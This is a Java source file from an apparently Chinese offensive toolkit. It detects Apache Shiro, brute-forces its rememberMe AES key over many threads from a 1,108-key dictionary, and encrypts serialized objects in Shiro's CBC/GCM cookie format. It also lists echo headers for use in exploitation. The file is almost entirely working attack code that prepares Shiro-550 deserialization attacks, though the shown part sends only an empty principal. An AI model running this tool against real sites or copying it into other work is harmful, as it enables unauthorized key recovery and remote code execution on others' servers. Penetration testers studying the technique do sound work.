package shiro;

import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Shiro 检测 / 密钥识别 / 利用支撑引擎（能力来源于 ShiroExploit 1.0.2 的重构实现）。
 *
 * <p>相对原始实现所做的优化：
 * <ul>
 *   <li>去掉 Spring、woodpecker-requests、MVC 分层等与「探测」无关的重型依赖，只用 JDK 原生 HTTP。</li>
 *   <li>密钥识别从「串行 + 每次固定 sleep 100ms」改为可配置并发，且支持随时中断。</li>
 *   <li>指纹判定不再只看「响应里是否出现 deleteMe」，而是与无 Cookie 基线做差值比较，降低误报。</li>
 *   <li>加解密直接用 JCE 实现 CBC / GCM，两种模式共用一套代码路径。</li>
 * </ul>
 *
 * <p>本类只负责按授权目标构造并发送测试报文，不写本地文件、不驻留进程。
 */
public final class ShiroEngine {

    /** rememberMe Cookie 名，Shiro 默认固定值。 */
    public static final String REMEMBER_ME = "rememberMe";

    private static final int CONNECT_TIMEOUT_MS = 8000;
    private static final int MAX_BODY_BYTES = 65536;

    private ShiroEngine() {
    }

    /** 一次请求的配置。 */
    public static final class Options {
        public String url = "";
        public String method = "GET";
        public String cookieName = REMEMBER_ME;
        public String contentType = "application/x-www-form-urlencoded";
        public String extraHeaders = "";
        public String body = "";
        public int timeoutSeconds = 8;
        public boolean followRedirect = false;

        public Options copy() {
            Options copy = new Options();
            copy.url = url;
            copy.method = method;
            copy.cookieName = cookieName;
            copy.contentType = contentType;
            copy.extraHeaders = extraHeaders;
            copy.body = body;
            copy.timeoutSeconds = timeoutSeconds;
            copy.followRedirect = followRedirect;
            return copy;
        }
    }

    /** 单次 HTTP 交换结果。 */
    public static final class HttpResult {
        public int status;
        public String headers = "";
        public String body = "";
        public long elapsedMs;
    }

    /** 指纹识别结果。 */
    public static final class FingerprintResult {
        public boolean reachable;
        public boolean shiroDetected;
        public int baselineDeleteMe;
        public int probeDeleteMe;
        public String statusLine = "";
        public String message = "";
        public final List<String> evidence = new ArrayList<String>();
    }

    /** 密钥识别结果。 */
    public static final class KeyResult {
        public String key;
        public boolean matched;
        public boolean gcm;
        public String message = "";
        public int tested;
    }

    /** 爆破进度回调。 */
    public interface CrackListener {
        void onProgress(int tested, int total, String currentKey);

        void onFound(String key, boolean gcm, int tested);
    }

    // ------------------------------------------------------------------
    // HTTP
    // ------------------------------------------------------------------

    /** 发送一次请求；rememberMeValue 为 null 时不带 Cookie。 */
    public static HttpResult send(Options options, String rememberMeValue) throws IOException {
        HttpURLConnection connection = null;
        long started = System.nanoTime();
        try {
            connection = (HttpURLConnection) new URL(options.url).openConnection();
            connection.setRequestMethod(methodOf(options));
            connection.setConnectTimeout(CONNECT_TIMEOUT_MS);
            connection.setReadTimeout(Math.max(1, options.timeoutSeconds) * 1000);
            connection.setInstanceFollowRedirects(options.followRedirect);
            connection.setUseCaches(false);
            connection.setRequestProperty("User-Agent", "JavaSecExpToolKit/1.0");
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Connection", "close");
            if (options.contentType != null && !options.contentType.trim().isEmpty()) {
                connection.setRequestProperty("Content-Type", options.contentType.trim());
            }
            Map<String, String> extraHeaders = parseHeaders(options.extraHeaders);
            for (Map.Entry<String, String> header : extraHeaders.entrySet()) {
                connection.setRequestProperty(header.getKey(), header.getValue());
            }
            // 会话 Cookie 与 rememberMe 要合并成同一个 Cookie 头一起发：HttpURLConnection
            // 对同名头是覆盖语义，分两次 set 只会留下最后一个
            String cookie = cookieHeaderOf(extraHeaders);
            if (rememberMeValue != null) {
                String rememberMe = options.cookieName + "=" + rememberMeValue;
                cookie = cookie.isEmpty() ? rememberMe : cookie + "; " + rememberMe;
            }
            // 附加请求头里的 Cookie 必须始终发出：它是从代理 / 抓包页带过来的登录态，
            // 基线请求同样需要（否则需要认证的接口一律被重定向到登录页），
            // 而 rememberMe 只是在此基础上追加，不能把会话 Cookie 覆盖掉。
            if (!cookie.isEmpty()) connection.setRequestProperty("Cookie", cookie);
            String body = options.body == null ? "" : options.body;
            if (!body.isEmpty()) {
                connection.setDoOutput(true);
                OutputStream output = connection.getOutputStream();
                output.write(body.getBytes(StandardCharsets.UTF_8));
                output.flush();
                output.close();
            }
            HttpResult result = new HttpResult();
            result.status = connection.getResponseCode();
            result.headers = joinHeaders(connection);
            result.body = readBody(connection);
            result.elapsedMs = (System.nanoTime() - started) / 1000000;
            return result;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    private static String methodOf(Options options) {
        String method = options.method == null ? "" : options.method.trim();
        return method.isEmpty() ? "GET" : method.toUpperCase(Locale.ROOT);
    }

    private static String joinHeaders(HttpURLConnection connection) {
        StringBuilder text = new StringBuilder();
        for (Map.Entry<String, List<String>> entry : connection.getHeaderFields().entrySet()) {
            if (entry.getKey() == null) {
                if (entry.getValue() != null) {
                    for (String value : entry.getValue()) text.append(value).append('\n');
                }
                continue;
            }
            for (String value : entry.getValue()) {
                text.append(entry.getKey()).append(": ").append(value).append('\n');
            }
        }
        return text.toString();
    }

    private static String readBody(HttpURLConnection connection) {
        InputStream stream = null;
        try {
            stream = connection.getResponseCode() >= 400 ? connection.getErrorStream() : connection.getInputStream();
            if (stream == null) return "";
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] chunk = new byte[8192];
            int read;
            while ((read = stream.read(chunk)) > 0 && buffer.size() < MAX_BODY_BYTES) {
                buffer.write(chunk, 0, read);
            }
            return new String(buffer.toByteArray(), StandardCharsets.UTF_8);
        } catch (IOException ignored) {
            return "";
        } finally {
            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException ignored) {
                    // 流已关闭
                }
            }
        }
    }

    /** 解析「每行一个 Key: Value」形式的附加请求头。 */
    public static Map<String, String> parseHeaders(String raw) {
        Map<String, String> headers = new LinkedHashMap<String, String>();
        if (raw == null) return headers;
        for (String line : raw.split("\r?\n")) {
            String text = line.trim();
            if (text.isEmpty() || text.startsWith("#")) continue;
            int colon = text.indexOf(':');
            if (colon <= 0) continue;
            String name = text.substring(0, colon).trim();
            String value = text.substring(colon + 1).trim();
            // 同名请求头合并而不是互相覆盖：从抓包页带过来的会话 Cookie 与
            // 使用者手工填的 Cookie 应当同时生效，否则登录态会莫名丢失
            String previous = findIgnoreCase(headers, name);
            if (previous != null) headers.put(previous, headers.get(previous) + "; " + value);
            else headers.put(name, value);
        }
        return headers;
    }

    /** 按不区分大小写的名字查找已存在的请求头，返回其原始键名。 */
    private static String findIgnoreCase(Map<String, String> headers, String name) {
        for (String key : headers.keySet()) {
            if (key.equalsIgnoreCase(name)) return key;
        }
        return null;
    }

    /** 取 Cookie 请求头的值（不区分大小写），没有则返回空串。 */
    private static String cookieHeaderOf(Map<String, String> headers) {
        String key = findIgnoreCase(headers, "Cookie");
        if (key == null) return "";
        String value = headers.get(key);
        return value == null ? "" : value.trim();
    }

    // ------------------------------------------------------------------
    // 指纹识别
    // ------------------------------------------------------------------

    /**
     * Shiro 指纹识别。
     *
     * <p>先取一次「不带 Cookie」的响应作为基线，再带一个随机 rememberMe 值请求一次：
     * Shiro 解不开该值时会回写 {@code Set-Cookie: rememberMe=deleteMe} 清除它。
     * 只有探测响应的 deleteMe 计数高于基线，才判定为 Shiro，避免目标无条件回写 Cookie 造成的误报。
     */
    public static FingerprintResult detect(Options options) {
        FingerprintResult result = new FingerprintResult();
        try {
            HttpResult baseline = send(options, null);
            result.reachable = true;
            result.baselineDeleteMe = countDeleteMe(baseline.headers);
            result.evidence.add("基线请求：HTTP " + baseline.status + "，deleteMe 计数 " + result.baselineDeleteMe
                    + "，" + baseline.elapsedMs + " ms");

            HttpResult probe = send(options, randomToken());
            result.probeDeleteMe = countDeleteMe(probe.headers);
            result.statusLine = "HTTP " + probe.status;
            result.evidence.add("携带随机 rememberMe：HTTP " + probe.status + "，deleteMe 计数 "
                    + result.probeDeleteMe + "，" + probe.elapsedMs + " ms");
            String setCookie = setCookieLines(probe.headers);
            if (!setCookie.isEmpty()) result.evidence.add("响应 Set-Cookie：" + setCookie);

            boolean grown = result.probeDeleteMe > result.baselineDeleteMe;
            boolean cleared = setCookie.toLowerCase(Locale.ROOT).contains("rememberme")
                    && setCookie.toLowerCase(Locale.ROOT).contains("deleteme");
            result.shiroDetected = grown || cleared;
            if (result.shiroDetected) {
                result.message = "确认存在 Shiro：目标会针对 rememberMe 回写 deleteMe 清除非法 Cookie。";
            } else if (probe.status == 405) {
                result.message = "目标返回 405（方法不允许）。请把请求方法切换为接口实际支持的方法（例如 POST）后重试。";
            } else if (probe.status == 401 || probe.status == 403) {
                result.message = "目标返回 " + probe.status + "，鉴权拦截了请求。请在「附加请求头」中补充有效 Cookie / Token 后重试。";
            } else if (probe.status >= 300 && probe.status < 400) {
                result.message = "目标返回 " + probe.status + " 跳转，请填写最终业务接口地址，或开启「跟随跳转」。";
            } else {
                result.message = "未确认 Shiro：响应中没有针对 rememberMe 的清除行为。";
            }
        } catch (IOException e) {
            result.message = "请求失败：" + e.getMessage();
        }
        return result;
    }

    /** 统计响应头中 deleteMe 出现次数（大小写不敏感）。 */
    public static int countDeleteMe(String headerText) {
        if (headerText == null || headerText.isEmpty()) return 0;
        String lower = headerText.toLowerCase(Locale.ROOT);
        String needle = "deleteme";
        int count = 0;
        int index = lower.indexOf(needle);
        while (index >= 0) {
            count++;
            index = lower.indexOf(needle, index + needle.length());
        }
        return count;
    }

    private static String setCookieLines(String headerText) {
        if (headerText == null) return "";
        StringBuilder text = new StringBuilder();
        for (String line : headerText.split("\n")) {
            if (line.toLowerCase(Locale.ROOT).startsWith("set-cookie")) {
                if (text.length() > 0) text.append(" | ");
                text.append(line.trim());
            }
        }
        return text.toString();
    }

    private static String randomToken() {
        return UUID.randomUUID().toString().replace("-", "");
    }

    // ------------------------------------------------------------------
    // 密钥识别与爆破
    // ------------------------------------------------------------------

    /** 内置密钥字典（去重后的 1108 条常见 Shiro Key）。 */
    public static List<String> builtinKeys() {
        List<String> keys = new ArrayList<String>();
        InputStream stream = ShiroEngine.class.getResourceAsStream("/shiro/res/shiro-keys.txt");
        if (stream == null) {
            ClassLoader loader = ShiroEngine.class.getClassLoader();
            if (loader != null) stream = loader.getResourceAsStream("shiro/res/shiro-keys.txt");
        }
        if (stream == null) return keys;
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream, StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String key = line.trim();
                if (!key.isEmpty() && !keys.contains(key)) keys.add(key);
            }
        } catch (IOException ignored) {
            // 读不到字典时返回已读取部分
        }
        return keys;
    }

    /** 解析手工填写的密钥（支持逗号、分号、空白分隔）。 */
    public static List<String> parseKeys(String raw) {
        if (raw == null) return new ArrayList<String>();
        return normalizeKeys(java.util.Arrays.asList(raw.split("[,;\\s]+")));
    }

    /** 去重并去掉空白项。 */
    public static List<String> normalizeKeys(List<String> keys) {
        Set<String> unique = new LinkedHashSet<String>();
        if (keys != null) {
            for (String key : keys) {
                if (key == null) continue;
                String trimmed = key.trim();
                if (!trimmed.isEmpty()) unique.add(trimmed);
            }
        }
        return new ArrayList<String>(unique);
    }

    /**
     * 单密钥识别。
     *
     * <p>用该密钥加密一个「空身份集合」再发送：密钥正确时目标能正常反序列化，不会回写 deleteMe；
     * 密钥错误时解密失败，deleteMe 计数相对基线发生变化。
     */
    public static KeyResult checkKey(Options options, String base64Key, boolean gcm, int baselineDeleteMe) {
        KeyResult result = new KeyResult();
        result.key = base64Key;
        result.gcm = gcm;
        String invalid = validateKey(base64Key);
        if (invalid != null) {
            result.message = invalid;
            return result;
        }
        try {
            byte[] cipher = encrypt(serializeEmptyPrincipal(), base64Key, gcm);
            if (cipher == null) {
                result.message = "加密失败：密钥不可用于 AES。";
                return result;
            }
            HttpResult probe = send(options, base64(cipher));
            int counts = countDeleteMe(probe.headers);
            result.matched = counts != baselineDeleteMe;
            result.message = result.matched
                    ? "密钥正确：密文被成功解密（deleteMe 计数 " + baselineDeleteMe + " → " + counts + "）。"
                    : "密钥错误：目标解密失败并回写 deleteMe。";
        } catch (IOException e) {
            result.message = "请求失败：" + e.getMessage();
        }
        return result;
    }

    /**
     * 按键字典并发爆破，命中即返回。
     *
     * @param cancel 外部中断标志，置为 true 后各线程会尽快退出
     */
    public static KeyResult crack(Options options, List<String> keys, boolean gcm, int baselineDeleteMe,
                                  int threads, CrackListener listener, AtomicBoolean cancel) {
        KeyResult found = new KeyResult();
        found.message = "字典中没有匹配的密钥。";
        List<String> candidates = normalizeKeys(keys);
        int total = candidates.size();
        if (total == 0) {
            found.message = "密钥字典为空，请检查字典内容。";
            return found;
        }
        AtomicInteger tested = new AtomicInteger();
        AtomicInteger cursor = new AtomicInteger();
        final KeyResult[] hit = new KeyResult[1];
        final Object lock = new Object();
        int workerCount = Math.max(1, Math.min(Math.max(1, threads), total));
        List<Thread> workers = new ArrayList<Thread>();

        for (int worker = 0; worker < workerCount; worker++) {
            Thread thread = new Thread(() -> {
                while (!cancel.get() && hit[0] == null) {
                    int current = cursor.getAndIncrement();
                    if (current >= total) return;
                    String key = candidates.get(current);
                    Options target = options.copy();
                    KeyResult single = checkKey(target, key, gcm, baselineDeleteMe);
                    int done = tested.incrementAndGet();
                    if (listener != null) listener.onProgress(done, total, key);
                    if (single.matched) {
                        synchronized (lock) {
                            if (hit[0] == null) {
                                hit[0] = single;
                                cancel.set(true);
                            }
                        }
                        if (listener != null) listener.onFound(key, gcm, done);
                        return;
                    }
                }
            }, "shiro-crack-" + worker);
            thread.setDaemon(true);
            workers.add(thread);
            thread.start();
        }
        for (Thread thread : workers) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        if (hit[0] != null) found = hit[0];
        found.tested = tested.get();
        return found;
    }

    // ------------------------------------------------------------------
    // 加解密
    // ------------------------------------------------------------------

    /**
     * 生成用于密钥识别的序列化数据：一个空的 Shiro 身份集合。
     *
     * <p>反序列化后不包含任何 gadget 调用链，仅用于验证密钥能否正确解密。
     */
    public static byte[] serializeEmptyPrincipal() {
        try {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            ObjectOutputStream output = new ObjectOutputStream(buffer);
            output.writeObject(new SimplePrincipalCollection());
            output.flush();
            output.close();
            return buffer.toByteArray();
        } catch (IOException e) {
            return new byte[0];
        }
    }

    /**
     * 按 Shiro 的方式加密。
     *
     * <p>CBC：AES/CBC/PKCS5Padding，IV 直接复用密钥；
     * GCM：AES/GCM/PKCS5Padding，随机 IV 前置在密文头部。
     */
    public static byte[] encrypt(byte[] plain, String base64Key, boolean gcm) {
        byte[] key = decodeBase64(base64Key);
        if (key == null || !(key.length == 16 || key.length == 24 || key.length == 32)) return null;
        try {
            if (gcm) {
                byte[] iv = new byte[16];
                new SecureRandom().nextBytes(iv);
                Cipher cipher = gcmCipher();
                cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
                byte[] encrypted = cipher.doFinal(plain);
                byte[] merged = new byte[iv.length + encrypted.length];
                System.arraycopy(iv, 0, merged, 0, iv.length);
                System.arraycopy(encrypted, 0, merged, iv.length, encrypted.length);
                return merged;
            }
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(key));
            return cipher.doFinal(plain);
        } catch (Exception e) {
            return null;
        }
    }

    /** 解密 Shiro rememberMe 值，用于本地校验自己生成的 payload。 */
    public static byte[] decrypt(byte[] cipherText, byte[] key, boolean gcm) {
        if (cipherText == null || key == null) return null;
        try {
            if (gcm) {
                if (cipherText.length <= 16) return null;
                byte[] iv = new byte[16];
                System.arraycopy(cipherText, 0, iv, 0, 16);
                byte[] body = new byte[cipherText.length - 16];
                System.arraycopy(cipherText, 16, body, 0, body.length);
                Cipher cipher = gcmCipher();
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
                return cipher.doFinal(body);
            }
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(key));
            return cipher.doFinal(cipherText);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 构造 GCM 模式的 Cipher。
     *
     * <p>JCE 要求 GCM 必须使用 NoPadding；部分环境对 PKCS5Padding 别名宽容，
     * 这里优先用标准写法，不可用时再退回旧别名，兼容不同 JDK 实现。
     */
    private static Cipher gcmCipher() throws java.security.GeneralSecurityException {
        try {
            return Cipher.getInstance("AES/GCM/NoPadding");
        } catch (java.security.NoSuchAlgorithmException ignored) {
            return Cipher.getInstance("AES/GCM/PKCS5Padding");
        }
    }

    /** 校验 Base64 密钥：可用返回 null，不可用返回原因。 */
    public static String validateKey(String base64Key) {
        if (base64Key == null || base64Key.trim().isEmpty()) return "密钥不能为空";
        byte[] key = decodeBase64(base64Key);
        if (key == null) return "不是合法的 Base64 字符串";
        if (!(key.length == 16 || key.length == 24 || key.length == 32)) {
            return "AES 密钥长度必须是 16/24/32 字节，当前为 " + key.length + " 字节";
        }
        return null;
    }

    public static byte[] decodeBase64(String text) {
        if (text == null) return null;
        String trimmed = text.trim();
        try {
            return Base64.getDecoder().decode(trimmed);
        } catch (IllegalArgumentException e) {
            try {
                return Base64.getMimeDecoder().decode(trimmed);
            } catch (IllegalArgumentException ignored) {
                return null;
            }
        }
    }

    public static String base64(byte[] data) {
        return data == null ? "" : Base64.getEncoder().encodeToString(data);
    }

    // ------------------------------------------------------------------
    // 辅助
    // ------------------------------------------------------------------

    /** 目标可达性自检：TCP 连通 + 一次 HTTP 请求。 */
    public static String probeReachability(Options options) {
        try {
            URL url = new URL(options.url);
            int port = url.getPort() > 0 ? url.getPort() : url.getDefaultPort();
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(url.getHost(), port), CONNECT_TIMEOUT_MS);
            socket.close();
            HttpResult result = send(options, null);
            return "可达：HTTP " + result.status + "（" + result.elapsedMs + " ms）";
        } catch (Exception e) {
            return "不可达：" + e.getMessage();
        }
    }

    /** 加密模式的可读描述。 */
    public static String describeMode(boolean gcm) {
        return gcm ? "AES-GCM（Shiro ≥ 1.4.2 默认）" : "AES-CBC（Shiro < 1.4.2 默认）";
    }

    /** 内置回显请求头候选。 */
    public static Set<String> defaultEchoHeaders() {
        Set<String> headers = new LinkedHashSet<String>();
        headers.add("X-Authorization");
        headers.add("OAuth");
        headers.add("X-Token");
        headers.add("Authorization");
        return headers;
    }

    /** Cookie 头预览文本，便于界面核对。 */
    public static String cookiePreview(Options options, String value) {
        return "Cookie: " + options.cookieName + "=" + value;
    }
}
